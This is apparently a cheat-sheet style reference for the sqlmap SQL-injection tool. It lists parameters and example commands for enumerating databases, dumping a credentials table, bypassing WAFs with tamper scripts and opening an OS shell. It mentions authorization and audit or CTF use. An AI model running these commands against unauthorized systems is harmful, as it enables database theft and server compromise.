# sqlmap

**SQL Map** — an open-source penetration testing tool that automates detection and exploitation of SQL injection flaws.

## Syntax

```
sqlmap -u <URL> [options]
```

## Purpose

Automatically detect and exploit SQL injection vulnerabilities in web applications. Supports numerous database backends (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, etc.) and can extract data, enumerate users, read files, and even execute commands on the database server.

## Common Parameters

| Parameter | Description |
|-----------|-------------|
| `-u` | Target URL (e.g., `http://example.com/page?id=1`) |
| `--data` | POST data string |
| `--cookie` | HTTP cookie header |
| `--random-agent` | Random User-Agent header |
| `--level` | Level of tests (1–5, higher = more thorough) |
| `--risk` | Risk of tests (1–3, higher = more intrusive) |
| `-p` | Parameter(s) to test |
| `--dbs` | Enumerate databases |
| `-D <db>` | Specify database |
| `--tables` | Enumerate tables |
| `-T <table>` | Specify table |
| `--columns` | Enumerate columns |
| `-C <col>` | Specify columns |
| `--dump` | Dump table contents |
| `--os-shell` | Interactive operating system shell |
| `--batch` | Non-interactive mode (use defaults) |
| `-r <file>` | Load HTTP request from file |
| `--tamper` | Use tamper scripts to bypass WAF |

## Examples

```bash
# Basic injection detection
sqlmap -u "http://10.10.10.1/page.php?id=1"

# Enumerate databases
sqlmap -u "http://10.10.10.1/page.php?id=1" --dbs

# Dump a specific database's tables
sqlmap -u "http://10.10.10.1/page.php?id=1" -D users --tables

# Dump entire table
sqlmap -u "http://10.10.10.1/page.php?id=1" -D users -T credentials --dump

# POST request injection
sqlmap -u "http://10.10.10.1/login.php" --data="user=admin&pass=test"

# Using request file from Burp Suite
sqlmap -r request.txt

# Bypass WAF with tamper scripts
sqlmap -u "http://10.10.10.1/page.php?id=1" --tamper=space2comment

# Get OS shell on high-privilege databases
sqlmap -u "http://10.10.10.1/page.php?id=1" --os-shell
```

## Common Mistakes

- Running without `--batch` in automated scripts — sqlmap prompts for confirmation, causing hangs.
- Using default `--level` and `--risk` — many injections are only detected at level 3+.
- Forgetting to supply cookies — authenticated pages will redirect to login.
- Dumping entire databases on slow connections — can take hours. Target specific tables.
- Using `--os-shell` without database superuser privileges — it will fail silently.
- Scanning production systems without authorization — illegal, and sqlmap can corrupt data.

## Real-World Usage

- **Web application audits:** Find and exploit SQL injection in custom applications.
- **CTF challenges:** Extract flag data from intentionally vulnerable databases.
- **Data extraction:** Dump user credentials, PII, and other sensitive information.
- **WAF bypass:** Use tamper scripts to bypass ModSecurity, Cloudflare, and other WAFs.

## Compatibility

| OS | Support | Notes |
|----|---------|-------|
| Linux | Full | Pre-installed on Kali, written in Python |
| Windows | Full | Python required, available via `sqlmap` command |
| macOS | Full | Python required |

```bash
# Install on Linux
sudo apt install sqlmap

# Or from GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```
